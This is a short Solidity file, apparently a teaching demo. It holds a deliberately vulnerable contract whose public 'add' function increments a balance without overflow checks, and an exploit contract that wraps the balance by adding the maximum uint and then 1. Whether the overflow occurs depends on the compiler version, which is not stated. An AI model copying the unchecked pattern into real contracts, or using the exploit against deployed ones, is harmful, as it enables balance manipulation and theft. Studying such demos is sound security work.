contract Overflow {
    uint private sellerBalance = 0;

    function add(uint value) public returns (bool) {
        sellerBalance += value;
        return true;
    }
}

contract ExploitOverflow {
    Overflow public target;

    constructor(address _target) {
        target = Overflow(_target);
    }

    function exploit() public {
        uint maxUint = type(uint).max;
        target.add(maxUint);
        target.add(1);
    }
}